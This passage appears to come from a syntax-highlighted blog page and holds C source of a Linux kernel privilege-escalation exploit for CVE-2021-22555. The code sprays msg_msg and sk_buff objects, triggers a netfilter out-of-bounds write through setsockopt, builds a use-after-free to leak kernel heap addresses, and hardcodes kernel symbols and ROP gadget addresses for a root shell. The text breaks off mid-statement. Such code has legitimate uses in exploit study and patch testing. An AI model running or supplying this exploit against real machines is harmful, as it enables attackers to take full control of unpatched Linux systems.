class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/netfilter_ipv4/ip_tables.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRIMARY_MSG_TYPE    0x41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_MSG_TYPE  0x42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VICTIM_MSG_TYPE     0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_TAG     0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOCKET_NUM 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SK_BUFF_NUM 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MSG_QUEUE_NUM 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82076500</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d1350</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff82a63be0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff810d0ec0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00f30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810310a3</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_sp, user_eflags;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, esp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_eflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    m_type;</span><br><span class="line">    <span class="type">uint64_t</span>    m_ts;</span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">    <span class="type">uint64_t</span>    security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;primary_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">&#125;secondary_msg;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * skb_shared_info need to take 320 bytes at the tail</span></span><br><span class="line"><span class="comment"> * so the max size of buf we should send is:</span></span><br><span class="line"><span class="comment"> * 1024 - 320 = 704</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> mtype;</span><br><span class="line">    <span class="type">char</span> mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg) + <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msgseg)];</span><br><span class="line">&#125; oob_msg;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    page;</span><br><span class="line">    <span class="type">uint32_t</span>    offset, len;</span><br><span class="line">    <span class="type">uint64_t</span>    ops;</span><br><span class="line">    <span class="type">uint32_t</span>    flags;</span><br><span class="line">    <span class="type">uint32_t</span>    padding;</span><br><span class="line">    <span class="type">uint64_t</span>    private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">uint64_t</span>    confirm;</span><br><span class="line">    <span class="type">uint64_t</span>    release;</span><br><span class="line">    <span class="type">uint64_t</span>    try_steal;</span><br><span class="line">    <span class="type">uint64_t</span>    get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">readMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">writeMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="type">long</span>*)msgp = msgtyp;</span><br><span class="line">    <span class="keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">peekMsg</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> *msgp, <span class="type">size_t</span> msgsz, <span class="type">long</span> msgtyp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="type">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMsg</span><span class="params">(<span class="keyword">struct</span> msg_msg *msg, <span class="type">uint64_t</span> m_list_next,</span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> m_list_prev, <span class="type">uint64_t</span> m_type, <span class="type">uint64_t</span> m_ts, </span></span><br><span class="line"><span class="params">    <span class="type">uint64_t</span> next, <span class="type">uint64_t</span> security)</span></span><br><span class="line">&#123;</span><br><span class="line">    msg-&gt;m_list.next = m_list_next;</span><br><span class="line">    msg-&gt;m_list.prev = m_list_prev;</span><br><span class="line">    msg-&gt;m_type = m_type;</span><br><span class="line">    msg-&gt;m_ts = m_ts;</span><br><span class="line">    msg-&gt;next = next;</span><br><span class="line">    msg-&gt;security = security;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">spraySkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// printf(&quot;[-] now %d, num %d\n&quot;, i, j);</span></span><br><span class="line">            <span class="keyword">if</span> (write(sk_socket[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">freeSkBuff</span><span class="params">(<span class="type">int</span> sk_socket[SOCKET_NUM][<span class="number">2</span>], <span class="type">void</span> *buf, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">            <span class="keyword">if</span> (read(sk_socket[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigerOutOfBoundWrite</span><span class="params">(<span class="type">int</span> socket_fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((__<span class="title">packed__</span>)) &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipt_replace</span> <span class="title">replace</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipt_entry</span> <span class="title">entry</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_match</span> <span class="title">match</span>;</span></span><br><span class="line">        <span class="type">char</span> pad[<span class="number">0x108</span> + PRIMARY_MSG_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>];</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> <span class="title">target</span>;</span></span><br><span class="line">    &#125; data = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    data.replace.num_counters = <span class="number">1</span>;</span><br><span class="line">    data.replace.num_entries = <span class="number">1</span>;</span><br><span class="line">    data.replace.size = <span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match)</span><br><span class="line">            + <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target);</span><br><span class="line">    </span><br><span class="line">    data.entry.next_offset = <span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match)</span><br><span class="line">            + <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target);</span><br><span class="line">    data.entry.target_offset = </span><br><span class="line">            <span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad);</span><br><span class="line">    </span><br><span class="line">    data.match.u.user.match_size = <span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad);</span><br><span class="line">    <span class="built_in">strcpy</span>(data.match.u.user.name, <span class="string">&quot;icmp&quot;</span>);</span><br><span class="line">    data.match.u.user.revision = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    data.target.u.user.target_size = <span class="keyword">sizeof</span>(data.target);</span><br><span class="line">    <span class="built_in">strcpy</span>(data.target.u.user.name, <span class="string">&quot;NFQUEUE&quot;</span>);</span><br><span class="line">    data.target.u.user.revision = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// partial overwrite the next object</span></span><br><span class="line">    <span class="keyword">if</span> (setsockopt(socket_fd, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, <span class="keyword">sizeof</span>(data)))</span><br><span class="line">        <span class="keyword">if</span> (errno == ENOPROTOOPT)</span><br><span class="line">            errExit(<span class="string">&quot;ip_tables module is not loaded!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">        errExit(<span class="string">&quot;failed to gain the root!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span>         socket_fd;</span><br><span class="line">    <span class="type">int</span>         sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span>         msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="type">int</span>         victim_qid, real_qid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span>  *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="type">uint64_t</span>    victim_addr;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_base;</span><br><span class="line">    <span class="type">uint64_t</span>    kernel_offset;</span><br><span class="line">    <span class="type">uint64_t</span>    *rop_chain;</span><br><span class="line">    <span class="type">int</span>         rop_idx;</span><br><span class="line">    <span class="type">cpu_set_t</span>   cpu_set;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.O</span></span><br><span class="line"><span class="comment">     * Initialization</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] CVE-2021-22555 Linux Privilege Escalation.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ident namespace</span></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// run the exp on specific core only</span></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// socket to trigert off-by-null</span></span><br><span class="line">    <span class="keyword">if</span> ((socket_fd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to create socket!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// socket pairs to spray sk_buff</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.I</span></span><br><span class="line"><span class="comment">     * build msg_queue, spray primary and secondary msg_msg,</span></span><br><span class="line"><span class="comment">     * and use OOB write to construct the overlapping</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.I spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Build message queue...&quot;</span>);</span><br><span class="line">    <span class="comment">// build 4096 message queue</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray primary and secondary message</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="type">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (writeMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create hole in primary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (readMsg(msqid[i], &amp;primary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(primary_msg), PRIMARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive primary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// triger off-by-null on primary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);</span><br><span class="line">    trigerOutOfBoundWrite(socket_fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find the queues that have the same secondary msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);</span><br><span class="line">    victim_qid = real_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((i % <span class="number">1024</span>) == <span class="number">0</span>)  <span class="comment">// the hole</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] error qid: %d\n&quot;</span>, i);</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">0</span>] != MSG_TAG)</span><br><span class="line">            errExit(<span class="string">&quot;failed to make corruption!&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (*(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">4</span>] != i)</span><br><span class="line">        &#123;</span><br><span class="line">            victim_qid = i;</span><br><span class="line">            real_qid = *(<span class="type">int</span>*) &amp;secondary_msg.mtext[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (victim_qid &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to make overlapping!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d \033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, </span><br><span class="line">            victim_qid, real_qid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.II</span></span><br><span class="line"><span class="comment">     * construct UAF</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the victim secondary msg_msg, then we get a UAF</span></span><br><span class="line">    <span class="keyword">if</span> (readMsg(msqid[real_qid], &amp;secondary_msg, </span><br><span class="line">                <span class="keyword">sizeof</span>(secondary_msg), SECONDARY_MSG_TYPE) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Step.III</span></span><br><span class="line"><span class="comment">     * spray sk_buff to leak msg_msg addr</span></span><br><span class="line"><span class="comment">     * construct fake msg_msg to leak addr of UAF obj</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray sk_buff to construct fake msg_msg</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff...&quot;</span>);</span><br><span class="line">    buildMsg((<span class="keyword">struct</span> msg_msg *)fake_secondary_msg, </span><br><span class="line">            *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, *(<span class="type">uint64_t</span>*)<span class="string">&quot;arttnba3&quot;</span>, </span><br><span class="line">            VICTIM_MSG_TYPE, <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// use fake msg_msg to read OOB</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] OOB read from victim msg_msg&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (*(<span class="type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nearby_msg = (<span class="keyword">struct</span> msg_msg*) </span><br><span class="line">            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> msg_msg)];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] 